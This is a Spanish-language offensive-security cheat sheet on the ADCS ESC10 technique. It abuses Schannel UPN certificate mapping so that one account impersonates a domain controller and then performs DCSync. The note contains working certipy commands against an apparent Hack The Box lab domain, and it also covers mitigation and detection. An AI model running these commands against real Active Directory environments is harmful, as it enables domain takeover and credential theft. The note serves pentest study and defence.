---
topic: ADCS — ESC10 y mapeo UPN de Schannel
tags: [windows, active-directory, adcs, esc10, schannel, certipy, dcsync]
---

# ADCS — ESC10 y mapeo UPN de Schannel

[🌐 English](esc10-upn-mapping.en.md) | **Español**

## Concepto

Si `CertificateMappingMethods` incluye `0x4`, Schannel permite autenticar por el UPN del certificado. Un atacante que controla el UPN de una cuenta puede poner el de otra, pedir un certificado con una plantilla accesible, restaurar el UPN y usar el certificado como la cuenta suplantada.

## Cuándo aplica

- Se controla el atributo `userPrincipalName` de una cuenta.
- Existe una plantilla de autenticación de usuario accesible.
- El DC tiene `CertificateMappingMethods` con el bit `0x4`.

## Procedimiento

1. Leer el UPN actual y guardarlo.
2. Cambiar el UPN al de la cuenta objetivo (por ejemplo, `DC01$`).
3. Pedir un certificado con la plantilla `User`.
4. Restaurar el UPN y autenticar con el PFX.
5. Usar el contexto para DCSync.

## Comandos

```bash
certipy account -user victim update -upn 'DC01$@domain.htb' -target DC01.domain.htb -k
certipy req -target DC01.domain.htb -ca <CA> -template User -u victim@domain.htb -p '<PASS>'
certipy account -user victim update -upn 'victim@domain.htb' -target DC01.domain.htb -k
certipy auth -pfx dc01.pfx -dc-ip <IP> -ldap-shell
```

## Variantes

- Cambiar el UPN a otro usuario privilegiado.
- Combinar con ESC9 si hay `GenericWrite`.
- Solicitar un certificado con SAN explícito.

## Limitaciones

- La cuenta Administrator puede estar protegida.
- El bit `0x4` debe estar activo en el DC.
- La plantilla debe permitir autenticación de cliente.

## Mitigación

- Revisar `CertificateMappingMethods` y deshabilitar UPN mapping.
- Restringir quién puede escribir UPN.
- Aplicar el mínimo privilegio en plantillas.

## Detección

- Cambios de UPN seguidos de solicitudes de certificado.
- Certificados emitidos para cuentas de máquina.
- DCSync desde una cuenta inesperada.

## Referencias

- [0xdf — Mirage](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [Certipy — ESC10](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication)
- [Microsoft — Schannel](https://learn.microsoft.com/en-us/windows-server/security/tls/tls-registry-settings)
